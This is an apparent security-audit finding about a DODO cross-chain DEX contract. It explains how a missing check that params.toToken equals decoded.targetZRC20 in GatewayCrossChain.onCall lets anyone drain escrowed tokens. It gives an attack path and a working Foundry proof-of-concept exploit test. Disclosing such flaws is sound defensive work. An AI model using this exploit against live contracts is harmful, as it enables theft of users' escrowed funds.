# Missing `params.toToken == decoded.targetZRC20` Validation in `GatewayCrossChain.onCall` Allows Anyone to Drain Arbitrary `decoded.targetZRC20` from GatewayCrossChain

### Summary

After a DODO swap within [`GatewayCrossChain.onCall`](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayCrossChain.sol#L442-L510), the function uses the swap's `outputAmount` which is the amount of `params.toToken` for subsequent withdrawal operations. However, the withdrawal logic assumes this `outputAmount` is the amount of `decoded.targetZRC20`. If an attacker crafts a payload where `params.toToken` is different from `decoded.targetZRC20`, the contract will misinterpret the `outputAmount`. This can lead to it attempting to withdraw its own `decoded.targetZRC20` using the amount derived from `params.toToken`, potentially causing theft.


### Root Cause

The bug occurs due to a missing validation step after the DODO swap in `GatewayCrossChain.onCall` and before withdrawal processing.
1.  **User-Controlled Swap Output and Withdrawal Target:** `onCall` decodes the user payload. `params.toToken` defines the output token of the DODO swap. `decoded.targetZRC20` defines the token intended for final withdrawal. Both are attacker-controlled.
2.  **Swap Execution:** `_doMixSwap` performs a swap (e.g., from `zrc20` to `params.toToken`) and returns `outputAmount`, which is a quantity of `params.toToken`.

    ```solidity
    uint256 outputAmount = _doMixSwap(decoded.swapDataZ, amountAfterFee, params); // outputAmount is the amount of params.toToken
    ```
3.  **Withdrawal Processing:** The `onCall` function then passes `outputAmount` and `decoded` (which contains `decoded.targetZRC20`) to withdrawal handlers like `_handleEvmOrSolanaWithdraw`.

    ```solidity
    function _handleEvmOrSolanaWithdraw(
        // ...,
        DecodedMessage memory decoded, // decoded.targetZRC20
        uint256 outputAmount,         // outputAmount is quantity of params.toToken 
        // ...
    ) internal returns (uint256 amountsOutTarget) {
        // gasFee is calculated for decoded.targetZRC20
        (address gasZRC20, uint256 gasFee) = IZRC20(decoded.targetZRC20).withdrawGasFeeWithGasLimit(gasLimit);
        
        if (decoded.targetZRC20 == gasZRC20) { 
            // ...
            // @audit Approves contract's OWN decoded.targetZRC20 for outputAmount
            IZRC20(decoded.targetZRC20).approve(address(gateway), outputAmount + gasFee); 
            // @audit Withdraws outputAmount of contract's OWN decoded.targetZRC20.
            withdrawAndCall( ..., decoded.targetZRC20, outputAmount - gasFee, ...);
            amountsOutTarget = outputAmount - gasFee;
        } else {
            // @audit Similar issue in _swapAndSendERC20Tokens:
            // outputAmount (amount of params.toToken) is used as targetAmount for decoded.targetZRC20
            amountsOutTarget = _swapAndSendERC20Tokens(decoded.targetZRC20, gasZRC20, gasFee, outputAmount);
            // ...
        }
    }
    ```
    **No check ensures `params.toToken == decoded.targetZRC20`.** If they differ, `outputAmount` the amount of `params.toToken` is incorrectly treated as the amount of `decoded.targetZRC20` for approval and withdrawal from `GatewayCrossChain`'s own balance of `decoded.targetZRC20`.

### Internal Pre-conditions

1.  `GatewayCrossChain` must hold a sufficient balance of `decoded.targetZRC20`.
2.  The initial swap from `zrc20` to `params.toToken` must be feasible.

### External Pre-conditions

1.  DODO has liquidity for the initial swap to `params.toToken`.
2.  Gateways are operational.

### Attack Path


1.  **Pre-condition:** `GatewayCrossChain` holds `1 CBBTC.BASE` (8 decimals). Attacker has some `DAI` (18 decimals).
2.  **Attacker's Action:** Initiates a cross-chain call targeting `GatewayCrossChain` on ZetaChain.
    *   Deposits `1e8` wei of DAI (becomes `zrc20 = DAI.ETH`, `amount = 1e8` in `onCall`).
    *   Payload is crafted:
        *   `decoded.targetZRC20 = CBBTC.BASE`.
        *   DODO swap parameters (`params`):
            *   `params.fromToken = DAI.ETH` (matches `zrc20`, so this [bug](https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex-pyk/issues/8) is not triggered here).
            *   `params.toToken = DAI.ETH` attacker makes the swap output DAI.ETH as well, for simplicity, or another low value token.
            *   `params.fromTokenAmount = 1e8` amount of `DAI.ETH` to swap for `DAI.ETH`.
    *   Assuming no slippage for simplicity. Result of `_doMixSwap`: `outputAmount` is `1e8` this is the amount of `DAI.ETH`.
3.  **Execution in `GatewayCrossChain.onCall` -> `_handleEvmOrSolanaWithdraw`:**
    *   `decoded.targetZRC20` is `CBBTC.ETH`.
    *   `outputAmount` is `1e8` this is the amount of `DAI.ETH`.
    *   The `_handleEvmOrSolanaWithdraw` function is called with `decoded.targetZRC20 = CBBTC.BASE` and `outputAmount = 1e8`.
    *   Assuming `gasZRC20` for `CBBTC.BASE` is `CBBTC.BASE`, the `if (decoded.targetZRC20 == gasZRC20)` branch is taken.
        *   Assuming `gasFee` in `CBBTC.BASE` is zero for simplicity.
        *   `IZRC20(CBBTC.BASE).approve(address(gateway), outputAmount + gasFee)` becomes `IZRC20(CBBTC.BASE).approve(gateway, 1e8 + 0);`.
            `GatewayCrossChain` approves its own `CBBTC.BASE` for withdrawal, using the amount derived from the `DAI.ETH` amount.
        *   `withdrawAndCall` is invoked to send `(outputAmount - gasFee)` of `GatewayCrossChain`'s `CBBTC.BASE)`. This means `1e8` wei of `CBBTC.BASE` are withdrawn.
4.  **Result**: `GatewayCrossChain` loses `1e8` wei of `CBBTC.BASE` (worth ~$105,000). The attacker only effectively "paid" for this with `1e8` wei of `DAI` (worth less than $0.001) as the initial deposit that set the `outputAmount`.

### Impact

If `params.toToken` is different from `decoded.targetZRC20`, the contract misinterprets `outputAmount`. This can lead to theft of valuable ZRC20 escrowed for refunds.

### PoC


Add the following test inside `test/GatewayCrossChain.t.sol` file:

```solidity

/// @dev This bug allows anyone to drain arbitary targetZRC20 from GatewayCrossChain
/// @custom:command forge test --match-contract GatewayCrossChainTest --match-test test_SwapToTokenNotEqualTargetZRC20 --fork-url https://zetachain-evm.blockpi.network/v1/rpc/public
function test_SwapToTokenNotEqualTargetZRC20() public {
    address targetContract = address(gatewayCrossChain);
    address attacker = makeAddr("attacker");

    // Assets
    ERC20Mock dai = new ERC20Mock("DAI", "DAI", 18);
    ZRC20Mock zrc20DAI = new ZRC20Mock("ZetaChain DAI Ethereum", "DAI.ETH", 18);
    ERC20Mock cbbtc = new ERC20Mock("Coinbase Bitcoin", "CBBTC", 8);
    ZRC20Mock zrc20CBBTC = new ZRC20Mock("ZetaChain CBBTC Base", "CBBTC.BASE", 8);

    // Balances
    dai.mint(attacker, 1e8); // 0.00xxx DAI
    zrc20DAI.mint(address(gatewayZEVM), 1e8); // Deposited DAI.ETH on ZetaChain
    zrc20CBBTC.mint(targetContract, 1e8); // 1 CBBTC.BASE e.g. for refund failed cross-chain tx
    cbbtc.mint(address(gatewayB), 1e8); // 1 CBBTC escrowed in gateway

    // Approvals
    vm.prank(attacker);
    dai.approve(address(gatewaySendA), type(uint256).max);

    // Gateways
    gatewayA.setZRC20(address(dai), address(zrc20DAI));
    gatewayB.setZRC20(address(cbbtc), address(zrc20CBBTC));
    zrc20CBBTC.setGasFee(0); // For simplicity
    zrc20CBBTC.setGasZRC20(address(zrc20CBBTC));

    // 1 DAI = 1 DAI
    dodoRouteProxyZ.setPrice(address(zrc20DAI), address(zrc20DAI), 1e18);

    // Payload
    address targetZRC20 = address(zrc20CBBTC); // !!! Bug's trigger
    bytes memory sender = abi.encodePacked(attacker);
    bytes memory receiver = abi.encodePacked(attacker);
    // For simplicity attacker swaps 1 DAI -> 1 DAI, but it can be any token
    bytes memory swapDataZ = encodeCompressedMixSwapParams(
        address(zrc20DAI),
        address(zrc20DAI), // !!! Bug's trigger
        1e8,
        0,
        0,
        new address[](1),
        new address[](1),
        new address[](1),
        0,
        new bytes[](1),
        abi.encode(address(0), 0),
        block.timestamp + 600
    );
    bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
    bytes memory fromTokenA = abi.encodePacked(address(cbbtc));
    bytes memory toTokenA = abi.encodePacked(address(cbbtc));
    bytes memory swapDataA = "";
    bytes memory accounts = "";
    bytes memory payload = encodeMessage(
        2,
        targetZRC20,
        sender,
        receiver,
        swapDataZ,
        contractAddress,
        abi.encodePacked(fromTokenA, toTokenA, swapDataA),
        accounts
    );

    vm.prank(attacker);
    gatewaySendA.depositAndCall(targetContract, 1e8, address(dai), 2, payload);

    // Attacker successfully drain 1 CBBTC (~$100,000) with less than 1 DAI (~$0.0001)
    assertEq(dai.balanceOf(attacker), 0);
    assertEq(cbbtc.balanceOf(attacker), 1e8);
}
```
